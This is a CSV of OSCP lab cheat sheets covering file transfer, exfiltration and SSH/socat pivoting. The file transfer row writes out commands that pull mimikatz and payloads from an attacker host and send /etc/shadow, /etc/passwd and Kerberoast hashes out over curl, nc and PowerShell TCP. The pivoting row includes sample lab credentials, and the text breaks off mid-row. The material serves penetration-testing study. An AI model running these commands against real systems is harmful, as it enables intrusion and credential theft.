"id","name","description","tags","educational_header","scenarios","sections"
"file-transfer-cheatsheet","File Transfer Methods for OSCP","Comprehensive guide to file transfer techniques for uploading tools to targets and exfiltrating data back to attack machine","FILE_TRANSFER|OSCP:HIGH|METHODOLOGY|QUICK_WIN","{""how_to_recognize"": [""You have initial access (shell/RDP) and need to upload enumeration tools"", ""Need to transfer exploit payloads to target system"", ""Must exfiltrate proof.txt, database dumps, or sensitive files"", ""HTTP downloads are blocked by firewall/proxy"", ""PowerShell execution policy prevents scripts""], ""when_to_look_for"": [""Immediately after gaining initial foothold (upload linpeas/winPEAS)"", ""During privilege escalation (upload exploit binaries)"", ""After finding credentials (exfiltrate password hashes/databases)"", ""When capturing flags (exfiltrate proof.txt/local.txt)"", ""In restricted environments (alternative transfer methods needed)""]}","[{""title"": ""Scenario 1: Initial Windows Shell - Upload Enumeration Tools"", ""context"": ""You have cmd.exe shell on Windows target via web shell or RCE. Need to upload winPEAS.exe for privilege escalation enumeration."", ""approach"": ""Setup HTTP server on Kali, use certutil as first choice (Windows built-in LOLBin), fallback to PowerShell if certutil blocked"", ""commands"": [""ft-python-http-server"", ""ft-certutil-download"", ""ft-powershell-iwr"", ""ft-powershell-webclient""], ""expected_outcome"": ""winPEAS.exe successfully downloaded to C:\\Windows\\Temp\\ within 30 seconds. Verify with 'dir' command showing correct file size."", ""why_this_works"": ""Certutil bypasses most AppLocker policies because it's a legitimate Windows certificate tool. PowerShell WebClient is fastest for large files. HTTP port 80/8000 usually allowed for outbound connections.""}, {""title"": ""Scenario 2: Linux SSH Access - Transfer Exploit Binary"", ""context"": ""You have SSH credentials for low-privileged user on Linux target. Found kernel vulnerability (CVE-2021-4034 PwnKit), need to transfer compiled exploit."", ""approach"": ""Use SCP if SSH access available (fastest/cleanest), otherwise setup HTTP server and wget/curl download"", ""commands"": [""ft-scp-upload"", ""ft-python-http-server"", ""ft-wget-download"", ""ft-curl-download""], ""expected_outcome"": ""Exploit binary transferred with execute permissions to /tmp/exploit. File hash matches source to ensure integrity."", ""why_this_works"": ""SCP is bidirectional and encrypted, cleanest method with SSH access. Wget/curl are ubiquitous on Linux. /tmp/ is world-writable fallback if home directory has restrictions.""}, {""title"": ""Scenario 3: Windows Target - HTTP Blocked, Use SMB"", ""context"": ""Windows Server 2016 target with strict egress filtering - HTTP/HTTPS outbound blocked by firewall. Port 445 (SMB) allowed for internal network traffic."", ""approach"": ""Setup Impacket SMB server on Kali, access files directly from UNC path or copy to local disk"", ""commands"": [""ft-smb-server"", ""ft-smb-download""], ""expected_outcome"": ""Files accessible via \\\\<KALI_IP>\\share\\. Can execute tools directly from share or copy locally. 10-50x faster than HTTP for large files."", ""why_this_works"": ""Port 445 often allowed on internal networks for legitimate file sharing. SMB blends with normal traffic. Can execute directly from share without writing to disk (stealthier).""}, {""title"": ""Scenario 4: Exfiltrate Proof.txt from Windows"", ""context"": ""Gained SYSTEM privileges on Windows target. Need to exfiltrate C:\\Users\\Administrator\\Desktop\\proof.txt to Kali for flag submission."", ""approach"": ""Setup uploadserver on Kali, use PowerShell Invoke-RestMethod to POST file, fallback to SMB if HTTP blocked, use pure PowerShell TCP if nc.exe unavailable"", ""commands"": [""ft-uploadserver"", ""ft-powershell-upload"", ""ft-smb-server"", ""ft-smb-upload"", ""ft-nc-receive"", ""ft-powershell-tcp-send""], ""expected_outcome"": ""proof.txt appears on Kali within 5 seconds. MD5 hash matches to verify integrity. File contains 32-character flag."", ""why_this_works"": ""Uploadserver accepts POST uploads at /upload endpoint. PowerShell Invoke-RestMethod is clean HTTP upload. SMB copy is fastest for any file size. Pure PowerShell TCP works when nc.exe not available. All methods preserve exact file contents.""}, {""title"": ""Scenario 5: Exfiltrate Database from Linux"", ""context"": ""Compromised web application, dumped MySQL database to /tmp/dump.sql (150MB). Need to exfiltrate to Kali for credential analysis."", ""approach"": ""For large files, use netcat or curl upload to avoid memory issues. Compress first if slow network."", ""commands"": [""ft-uploadserver"", ""ft-curl-upload"", ""ft-nc-receive"", ""ft-nc-send""], ""expected_outcome"": ""150MB database transferred within 2-5 minutes on local network. Verify file size matches source. Extract credentials for lateral movement."", ""why_this_works"": ""Curl handles large files efficiently with streaming. Netcat is simplest (no dependencies) and works when HTTP blocked. Compression reduces transfer time but requires additional step.""}, {""title"": ""Scenario 6: Restricted Shell - No wget/curl Available"", ""context"": ""Linux target with minimal installed tools. No wget, curl, nc, scp available. Only bash and basic utilities."", ""approach"": ""Use bash /dev/tcp pseudo-device for raw TCP connection to download files"", ""commands"": [""ft-python-http-server"", ""ft-nc-receive"", ""ft-bash-dev-tcp""], ""expected_outcome"": ""File downloaded using only bash built-in features. No external commands executed (stealthier in logs)."", ""why_this_works"": ""Bash /dev/tcp creates TCP connections without external tools. Works when all download utilities removed. Requires bash (not sh/dash). Some systems compile bash without /dev/tcp support.""}, {""title"": ""Scenario 7: Copy/Paste Exfiltration - No Network Transfer"", ""context"": ""Windows target via RDP with clipboard access. Network file transfers monitored/blocked by DLP. Need to exfiltrate small config file (5KB)."", ""approach"": ""Encode file as base64, copy output, paste to Kali, decode"", ""commands"": [""ft-base64-encode""], ""expected_outcome"": ""File encoded as text, copied via clipboard, decoded on Kali matching original. Bypasses network monitoring."", ""why_this_works"": ""Base64 converts binary to printable text safe for clipboard. ~33% size increase. Only practical for files <1MB due to manual copy/paste. Works when all network transfers blocked.""}]","[{""title"": ""Phase 1: Setup Attack Machine Servers"", ""notes"": ""Start these servers on Kali BEFORE attempting file transfers. Run in separate terminal windows to monitor connections."", ""commands"": [{""id"": ""ft-python-http-server"", ""example"": ""python3 -m http.server 8000"", ""shows"": ""Serving HTTP on 0.0.0.0 port <PORT>""}, {""id"": ""ft-smb-server"", ""example"": ""impacket-smbserver share . -smb2support"", ""shows"": ""Impacket v0.x.x - Copyright message""}, {""id"": ""ft-uploadserver"", ""example"": ""python3 -m uploadserver 80"", ""shows"": ""File upload available at /upload""}]}, {""title"": ""Phase 2: Windows Target Downloads (Tools IN)"", ""notes"": ""Transfer enumeration tools, exploits, or utilities TO Windows target. Try methods in order: certutil (fastest/stealthiest) \u2192 PowerShell \u2192 SMB (if HTTP blocked) \u2192 bitsadmin (background)."", ""commands"": [{""id"": ""ft-certutil-download"", ""example"": ""certutil -urlcache -f http://10.10.14.5:8000/nc.exe nc.exe"", ""shows"": ""****  Online  ****""}, {""id"": ""ft-powershell-iwr"", ""example"": ""powershell -ep bypass -c \""Invoke-WebRequest -Uri http://10.10.14.5:8000/winPEAS.exe -OutFile C:\\Temp\\winPEAS.exe\"""", ""shows"": ""StatusCode : 200""}, {""id"": ""ft-powershell-webclient"", ""example"": ""powershell -ep bypass -c \""(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/mimikatz.exe','C:\\Windows\\Temp\\mimikatz.exe')\"""", ""shows"": ""Command completes without output (silence means success)""}, {""id"": ""ft-smb-download"", ""example"": ""copy \\\\10.10.14.5\\share\\nc.exe C:\\Temp\\nc.exe"", ""shows"": ""1 file(s) copied""}, {""id"": ""ft-bitsadmin-download"", ""example"": ""bitsadmin /transfer myDownload /download /priority high http://10.10.14.5:8000/payload.exe C:\\Windows\\Temp\\payload.exe"", ""shows"": ""Transfer job completed""}]}, {""title"": ""Phase 3: Linux Target Downloads (Tools IN)"", ""notes"": ""Transfer tools TO Linux target. wget is most common \u2192 curl if wget unavailable \u2192 /dev/tcp if no tools available."", ""commands"": [{""id"": ""ft-wget-download"", ""example"": ""wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh"", ""shows"": ""HTTP request sent, awaiting response... 200 OK""}, {""id"": ""ft-curl-download"", ""example"": ""curl http://10.10.14.5:8000/exploit.sh -o /tmp/exploit.sh"", ""shows"": ""Progress bar reaches 100%""}, {""id"": ""ft-bash-dev-tcp"", ""example"": ""cat < /dev/tcp/10.10.14.5/4444 > /tmp/file"", ""shows"": ""File created: ls -la <OUTPUT>""}]}, {""title"": ""Phase 4: Windows Exfiltration (Data OUT)"", ""notes"": ""Transfer proof.txt, hashes, databases FROM Windows target to Kali. PowerShell upload is cleanest \u2192 SMB for large files \u2192 netcat if HTTP blocked \u2192 pure PowerShell TCP if nc.exe unavailable."", ""commands"": [{""id"": ""ft-powershell-upload"", ""example"": ""powershell -ep bypass -c \""Invoke-RestMethod -Uri http://10.10.14.5:80/upload -Method Post -InFile 'C:\\Users\\user\\Desktop\\proof.txt'\"""", ""shows"": ""StatusCode : 200""}, {""id"": ""ft-smb-upload"", ""example"": ""copy \""C:\\Users\\user\\Desktop\\data.zip\"" \\\\10.10.14.5\\share\\"", ""shows"": ""1 file(s) copied""}, {""id"": ""ft-nc-send"", ""example"": ""nc 10.10.14.5 4444 < /etc/passwd"", ""shows"": ""Connection established (no error)""}, {""id"": ""ft-powershell-tcp-send"", ""example"": ""$client = New-Object System.Net.Sockets.TcpClient(\""10.10.14.5\"", 4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); Get-Content .\\hashes.kerberoast | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); $client.Close()"", ""shows"": ""No error output""}]}, {""title"": ""Phase 5: Linux Exfiltration (Data OUT)"", ""notes"": ""Transfer data FROM Linux target to Kali. Curl upload for HTTP \u2192 netcat for raw TCP \u2192 SCP if SSH credentials available."", ""commands"": [{""id"": ""ft-curl-upload"", ""example"": ""curl -X POST -F file=@/etc/shadow http://10.10.14.5:80/upload"", ""shows"": ""100 Continue""}, {""id"": ""ft-nc-send"", ""example"": ""nc 10.10.14.5 4444 < /etc/passwd"", ""shows"": ""Connection established (no error)""}, {""id"": ""ft-scp-download"", ""example"": ""scp user@192.168.45.100:/home/user/proof.txt ./proof.txt"", ""shows"": ""Password/key auth succeeds""}]}, {""title"": ""Phase 6: Netcat & Raw TCP Transfers"", ""notes"": ""Universal transfer method when HTTP/SMB unavailable. Works on both Linux and Windows. Receiver starts first with -l flag, sender connects. Use pure PowerShell TCP if nc.exe not available on Windows."", ""commands"": [{""id"": ""ft-nc-receive"", ""example"": ""nc -lvnp 4444 > received_file.txt"", ""shows"": ""Listening on 0.0.0.0 <PORT>""}, {""id"": ""ft-nc-send"", ""example"": ""nc 10.10.14.5 4444 < /etc/passwd"", ""shows"": ""Connection established (no error)""}, {""id"": ""ft-powershell-tcp-send"", ""example"": ""$client = New-Object System.Net.Sockets.TcpClient(\""10.10.14.5\"", 4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); Get-Content .\\hashes.kerberoast | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); $client.Close()"", ""shows"": ""No error output""}]}, {""title"": ""Phase 7: Alternative Methods (Restricted Environments)"", ""notes"": ""Use when standard methods fail due to firewalls, missing tools, or security controls."", ""commands"": [{""id"": ""ft-base64-encode"", ""example"": ""base64 -w0 binary.exe"", ""shows"": ""Base64 string output to terminal""}, {""id"": ""ft-bash-dev-tcp"", ""example"": ""cat < /dev/tcp/10.10.14.5/4444 > /tmp/file"", ""shows"": ""File created: ls -la <OUTPUT>""}, {""id"": ""ft-bitsadmin-download"", ""example"": ""bitsadmin /transfer myDownload /download /priority high http://10.10.14.5:8000/payload.exe C:\\Windows\\Temp\\payload.exe"", ""shows"": ""Transfer job completed""}, {""id"": ""ft-scp-upload"", ""example"": ""scp exploit.sh user@192.168.45.100:/tmp/"", ""shows"": ""Password prompt appears (if using password auth)""}, {""id"": ""ft-scp-download"", ""example"": ""scp user@192.168.45.100:/home/user/proof.txt ./proof.txt"", ""shows"": ""Password/key auth succeeds""}]}]"
"ssh-tunneling-linux","SSH Tunneling - Linux Pivot Techniques","Master port forwarding and SSH tunneling through Linux pivot points to traverse network boundaries and bypass firewalls in OSCP environments","SSH|TUNNELING|PIVOTING|OSCP:HIGH|LINUX|SOCKS|PORT_FORWARDING|FIREWALL_BYPASS|SOCAT|PROXYCHAINS|REVERSE_TUNNEL","{""how_to_recognize"": [""Compromised Linux host with multiple network interfaces (ip addr shows ens192, ens224)"", ""Database/service credentials found but no client tools installed on compromised host"", ""Firewall blocking direct access to internal services from attack machine"", ""SSH client available on compromised host (which ssh returns /usr/bin/ssh)"", ""Need to access multiple internal services through single pivot point"", ""Segmented network with DMZ hosts straddling WAN and internal subnets""], ""when_to_look_for"": [""After gaining initial foothold on perimeter host with limited tooling"", ""When nmap shows compromised host has multiple IPs in different subnets"", ""When credentials found but corresponding service not directly accessible"", ""Need to pivot deeper into network through intermediate jump host"", ""Firewall allows outbound SSH but blocks inbound connections to pivot host"", ""Enumerating complex internal networks with 10+ services across multiple hosts""]}","[{""title"": ""Scenario 1: Socat Port Forward - PostgreSQL Access Through DMZ Host"", ""context"": ""Target: Confluence server (CONFLUENCE01) with RCE vulnerability (CVE-2022-26134), dual-homed (WAN: 192.168.50.63, DMZ: 10.4.50.63). Found PostgreSQL credentials in /var/atlassian/confluence.cfg.xml pointing to PGDATABASE01 (10.4.50.215:5432). No psql client on CONFLUENCE01. No firewall between Kali and CONFLUENCE01. Socat installed. Goal: Query PostgreSQL from Kali machine.\n\nNetwork Topology:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510          \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510          \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Kali     \u2502\u2500\u2500\u2500\u2500WAN\u2500\u2500\u2500\u2502 CONFLUENCE01 \u2502\u2500\u2500\u2500DMZ\u2500\u2500\u2500\u2500\u2502 PGDATABASE01 \u2502\n\u2502 192.168.x.4 \u2502          \u2502 192.168.50.63\u2502          \u2502 10.4.50.215  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518          \u2502 10.4.50.63   \u2502          \u2502    Port 5432 \u2502\n                         \u2502  Port 2345   \u2502          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518"", ""approach"": ""Step 1: Verify Socat availability:\n  which socat. \nStep 2: Listen on CONFLUENCE01 WAN interface port 2345, forward to PGDATABASE01:5432:\n  socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432. \nStep 3: From Kali, connect to forwarded port:\n  psql -h 192.168.50.63 -p 2345 -U postgres (password: D@t4basePassw0rd!). \nStep 4: Enumerate databases: \\l. \nStep 5: Query confluence database: \\c confluence; select * from cwd_user; \nStep 6: Extract password hashes, crack with Hashcat:\n  hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt. Traffic Flow: Kali:psql \u2192 CONFLUENCE01:2345 (Socat listens) \u2192 PGDATABASE01:5432 (PostgreSQL)."", ""commands"": [""socat-port-forward"", ""psql-connect""], ""expected_outcome"": ""Socat verbose output shows 'listening on AF=2 0.0.0.0:2345'. psql connects successfully, lists 4 databases (confluence, postgres, template0, template1). Query cwd_user table reveals Atlassian PBKDF2-HMAC-SHA1 password hashes. Hashcat cracks database_admin:sqlpass123, hr_admin:Welcome1234, rdp_admin:P@ssw0rd! within 5 minutes using fasttrack.txt.\n\nTime: 2-3 minutes for setup, 3-5 minutes for hash cracking.\n\nLimitation: One socket per Socat process - need new process for each port.\n\nAlternative: If Socat unavailable, use iptables (requires root): iptables -t nat -A PREROUTING -p tcp --dport 2345 -j DNAT --to-destination 10.4.50.215:5432, or Netcat + FIFO pipe: mkfifo /tmp/pipe; nc -l -p 2345 < /tmp/pipe | nc 10.4.50.215 5432 > /tmp/pipe."", ""why_this_works"": ""Socat creates bidirectional byte stream relay between two sockets. TCP-LISTEN:2345,fork opens listening socket on all interfaces (0.0.0.0:2345), fork creates new subprocess for each connection (prevents single-connection death). TCP:10.4.50.215:5432 defines destination socket. All packets received on listening port forwarded to destination. No firewall between Kali\u2192CONFLUENCE01 allows binding on WAN interface. CONFLUENCE01 can route to DMZ subnet (10.4.50.0/24) per ip route output showing 'dev ens224 proto kernel scope link src 10.4.50.63'.\n\nResult: Transparent relay - psql on Kali behaves as if directly connected to PGDATABASE01.""}, {""title"": ""Scenario 2: SSH Local Port Forward - Multi-Hop SMB Access"", ""context"": ""Target: CONFLUENCE01 (dual-homed), PGDATABASE01 (SSH running, database_admin:sqlpass123 credentials from cracked hashes), HRSHARES (172.16.50.217:445 SMB). PGDATABASE01 has 3 interfaces (DMZ: 10.4.50.215, Internal: 172.16.50.215, Management: ens256 down). HRSHARES only accessible from PGDATABASE01 internal network, not from CONFLUENCE01. No firewall on CONFLUENCE01 WAN interface. Goal: Access SMB share on HRSHARES from Kali.\n\nNetwork Topology:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Kali \u2502\u2500\u2500WAN\u2500\u2502CONFLUENCE01\u2502\u2500\u2500DMZ\u2500\u2502 PGDATABASE01 \u2502\u2500\u2500Int\u2500\u2502 HRSHARES \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502192.168.50.63      \u2502 10.4.50.215  \u2502      \u2502172.16.x  \u2502\n              \u2502Port 4455  \u2502      \u2502172.16.50.215 \u2502      \u2502Port 445  \u2502\n              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                   \u2191                    \u2193\n                   \u2514\u2500\u2500SSH Tunnel\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518"", ""approach"": ""Step 1: From CONFLUENCE01 reverse shell, spawn TTY:\n  python3 -c 'import pty; pty.spawn(\""/bin/sh\"")'. \nStep 2: Enumerate PGDATABASE01 interfaces:\n  ssh database_admin@10.4.50.215 (password: sqlpass123), run ip addr (confirms 172.16.50.215 interface). \nStep 3: Discover HRSHARES:\n  for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done (finds 172.16.50.217:445 open). \nStep 4: Exit SSH, create local port forward:\n  ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215. \nStep 5: Verify listening on CONFLUENCE01:\n  ss -ntplu | grep 4455 (shows 0.0.0.0:4455). \nStep 6: From Kali, connect through forward:\n  smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234. \nStep 7: Access scripts share:\n  smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234, download files: get Provisioning.ps1. Traffic: Kali \u2192 CONFLUENCE01:4455 (SSH client listens) \u2192 SSH tunnel \u2192 PGDATABASE01 (SSH server forwards) \u2192 HRSHARES:445."", ""commands"": [""ssh-local-port-forward"", ""smbclient-list-shares""], ""expected_outcome"": ""SSH connects without output (-N flag suppresses shell). ss shows tcp LISTEN 0 128 0.0.0.0:4455 0.0.0.0:*. smbclient lists 5 shares: ADMIN$, C$, IPC$, scripts, Users. scripts share contains Provisioning.ps1 (387 bytes) and README.txt (145 bytes). Files download directly to Kali /home/kali directory.\n\nTime: 3-4 minutes.\n\nLimitation: One socket per -L flag - targeting multiple ports requires multiple -L flags in one SSH command (e.g., -L 4455:172.16.50.217:445 -L 3390:172.16.50.217:3389) or separate SSH sessions.\n\n\n\nAlternative: If SSH unavailable, chain Socat processes: On CONFLUENCE01: socat TCP-LISTEN:4455,fork TCP:10.4.50.215:8888.\n\n On PGDATABASE01: socat TCP-LISTEN:8888,fork TCP:172.16.50.217:445.\n\n Or use netcat relays with FIFOs."", ""why_this_works"": ""SSH -L creates local port forward. Syntax: -L [bind_address:]port:host:hostport. Listening socket (0.0.0.0:4455) bound by SSH client on CONFLUENCE01. Packets received on this port pushed through encrypted SSH tunnel to PGDATABASE01 SSH server.\n\nSSH server on PGDATABASE01 forwards packets to specified destination (172.16.50.217:445). PGDATABASE01 can route to 172.16.50.0/24 subnet per ip route showing 'dev ens224 proto kernel scope link src 172.16.50.215'.\n\nMulti-hop chain: Kali\u2192CONFLUENCE01 (direct TCP connection)\u2192PGDATABASE01 (SSH tunnel encryption)\u2192HRSHARES (destination forwarding).\n\nSSH encrypts all traffic between CONFLUENCE01 and PGDATABASE01, hiding SMB protocol from network inspection.""}, {""title"": ""Scenario 3: SSH Dynamic Port Forward - SOCKS Proxy Multi-Target Enumeration"", ""context"": ""Target: Need to enumerate entire 172.16.50.0/24 subnet from Kali machine. Only have SSH access to PGDATABASE01 (database_admin:sqlpass123 credentials). Multiple services need testing (SMB:445, HTTP:80, RDP:3389, etc.) across multiple hosts. SSH local port forward would require separate tunnel per socket. Nmap not installed on PGDATABASE01. Goal: Flexible access to any host:port in internal subnet via single SOCKS tunnel.\n\nNetwork Topology:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Kali \u2502\u2500\u2500WAN\u2500\u2502CONFLUENCE01\u2502\u2500\u2500DMZ\u2500\u2502 PGDATABASE01 \u2502\u2500\u2500Int\u2500\u2502172.16.50.0/24\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502Port 9999   \u2502      \u2502 (SSH server) \u2502      \u2502  Subnet     \u2502\n     \u2193        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502 HRSHARES    \u2502\nProxychains         \u2191                    \u2193               \u2502 MULTISERVER \u2502\n     \u2193              \u2514\u2500\u2500SSH SOCKS Tunnel\u2500\u2500\u2518               \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n  Nmap/smbclient \u2192 SOCKS packets \u2192 Any addressable socket"", ""approach"": ""Step 1: From CONFLUENCE01, spawn TTY:\n  python3 -c 'import pty; pty.spawn(\""/bin/sh\"")'. \nStep 2: Create SSH dynamic port forward:\n  ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215. \nStep 3: Verify SOCKS port:\n  ss -ntplu | grep 9999 (shows 0.0.0.0:9999). \nStep 4: On Kali, configure Proxychains: Edit /etc/proxychains4.conf, replace proxy list with 'socks5 192.168.50.63 9999'. \nStep 5: Optimize scan speed: Edit same file, set 'tcp_read_time_out = 1000' and 'tcp_connect_time_out = 1000' (default 4000ms too slow). \nStep 6: Port scan through SOCKS:\n  sudo proxychains nmap -vvv -sT --top-ports=20 -Pn -n 172.16.50.217 (requires sudo for raw sockets). \nStep 7: Access discovered SMB:\n  proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234. \nStep 8: Multiple targets:\n  proxychains nmap -sT -p445 -Pn 172.16.50.0/24 (sweep entire subnet for SMB). Traffic: Kali tool \u2192 Proxychains (LD_PRELOAD hooks libc) \u2192 SOCKS5 packets \u2192 CONFLUENCE01:9999 \u2192 SSH tunnel \u2192 PGDATABASE01 \u2192 Destination."", ""commands"": [""ssh-dynamic-port-forward"", ""proxychains-config"", ""proxychains-nmap""], ""expected_outcome"": ""SSH creates SOCKS5 proxy on port 9999 (netstat shows 'tcp 0 0 0.0.0.0:9999 0.0.0.0:* LISTEN'). Proxychains output shows '[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:445 ... OK'. Nmap scan returns ports 135 (msrpc), 139 (netbios-ssn), 445 (microsoft-ds), 3389 (ms-wbt-server) open on HRSHARES. smbclient lists 5 shares through SOCKS proxy. Scan time: 3-5 minutes for 20 ports on single host (TCP connect scan slower through SOCKS). Full /24 sweep: 10-15 minutes.\n\nSuccess rate: Works with dynamically-linked binaries (nmap, curl, smbclient, psql). Fails with statically-linked binaries (golang tools).\n\nLimitation: TCP-only (no UDP/ICMP), DNS resolution inside tunnel (use -n flag for Nmap).\n\nAlternative: If proxychains incompatible, use redsocks (transparent TCP proxy), tsocks (older SOCKS wrapper), or sshuttle -r user@pivot 172.16.50.0/24 (requires root on Kali, Python3 on PGDATABASE01)."", ""why_this_works"": ""SSH -D creates SOCKS proxy server on SSH client (CONFLUENCE01).\n\nSOCKS (Socket Secure) protocol wraps packets with destination address headers. Syntax: client \u2192 SOCKS proxy: [SOCKS CONNECT host:port] + [payload].\n\nSSH client (CONFLUENCE01) receives SOCKS packets on port 9999, pushes through encrypted tunnel to SSH server (PGDATABASE01).\n\nSSH server unwraps SOCKS headers, extracts destination address, forwards packets to addressed socket. Proxychains intercepts libc networking functions (connect(), send(), recv()) via LD_PRELOAD environment variable hack, transparently wraps all network calls in SOCKS protocol before sending.\n\nResult: Any socket PGDATABASE01 can route to becomes accessible from Kali through single tunnel. Single tunnel serves multiple concurrent connections (unlike SSH local forward's one-port limitation).""}, {""title"": ""Scenario 4: SSH Remote Port Forward - Bypass Perimeter Firewall"", ""context"": ""Target: Perimeter firewall now active on CONFLUENCE01. Only TCP/8090 (Confluence web app) allowed inbound to CONFLUENCE01 WAN interface. Cannot bind listening ports on CONFLUENCE01 WAN interface and connect from Kali (previous Socat/SSH local techniques blocked). Still need access to PGDATABASE01 PostgreSQL (10.4.50.215:5432) from Kali. CONFLUENCE01 can SSH outbound to Kali machine (outbound connections allowed). Kali SSH server running. Goal: Access PostgreSQL from Kali despite inbound firewall blocking all ports except 8090.\n\nFirewall Topology:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2554\u2550\u2550\u2550FIREWALL\u2550\u2550\u2550\u2557      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Kali \u2502\u2500\u2500WAN\u2500\u2551 Only 8090 IN \u2551\u2500\u2500WAN\u2500\u2502CONFLUENCE01\u2502\u2500\u2500DMZ\u2500\u2502 PGDATABASE01 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2551 All OUT OK   \u2551      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502 Port 5432    \u2502\n   \u2191          \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d            \u2193              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n   \u2502                                      \u2502\n   \u2514\u2500\u2500\u2500SSH connection (CONFLUENCE01 initiates)\u2500\u2500\u2500\u2518\n        Port 2345 bound on Kali loopback"", ""approach"": ""Step 1: Enable Kali SSH server:\n  sudo systemctl start ssh, check status: sudo systemctl status ssh (should show 'active (running)'). \nStep 2: Set strong Kali password:\n  passwd kali (SSH requires password or key auth). \nStep 3: Enable password auth:\n  sudo nano /etc/ssh/sshd_config, set 'PasswordAuthentication yes', restart: sudo systemctl restart ssh. \nStep 4: From CONFLUENCE01 reverse shell, spawn TTY:\n  python3 -c 'import pty; pty.spawn(\""/bin/bash\"")'. \nStep 5: Initiate reverse tunnel:\n  ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4 (enter Kali password). \nStep 6: On Kali, verify listening port:\n  ss -ntplu | grep 2345 (shows tcp LISTEN 0 128 127.0.0.1:2345 0.0.0.0:*). \nStep 7: Connect from Kali loopback:\n  psql -h 127.0.0.1 -p 2345 -U postgres (password: D@t4basePassw0rd!). \nStep 8: Query database: \\l, \\c confluence, select * from cwd_user;. Traffic: Kali loopback:2345 \u2192 SSH tunnel (reverse direction) \u2192 CONFLUENCE01 \u2192 PGDATABASE01:5432. Firewall allows: CONFLUENCE01 \u2192 Kali:22 (outbound SSH). Firewall blocks: Kali \u2192 CONFLUENCE01:2345 (but not needed - port on Kali side)."", ""commands"": [""systemctl-start-ssh"", ""ssh-remote-port-forward"", ""psql-connect""], ""expected_outcome"": ""SSH connection from CONFLUENCE01 to Kali succeeds (outbound SSH allowed). No immediate output after password entry (-N flag prevents shell). Port 2345 bound on Kali loopback only (127.0.0.1, not all interfaces). ss shows 'Recv-Q: 0, Send-Q: 128, Local: 127.0.0.1:2345, State: LISTEN'. psql connects to localhost:2345, successfully queries PostgreSQL on PGDATABASE01. Lists 4 databases, queries confluence database user table.\n\nTime: 2-3 minutes for setup.\n\nLimitation: Listening socket bound to loopback (127.0.0.1) only - cannot access from other machines on Kali's network. To bind all interfaces (0.0.0.0), SSH server must allow GatewayPorts: Edit Kali /etc/ssh/sshd_config, add 'GatewayPorts yes', restart sshd. Security note: GatewayPorts in hostile network allows anyone to connect to forwarded port.\n\nAlternative: If SSH blocked outbound, use DNS 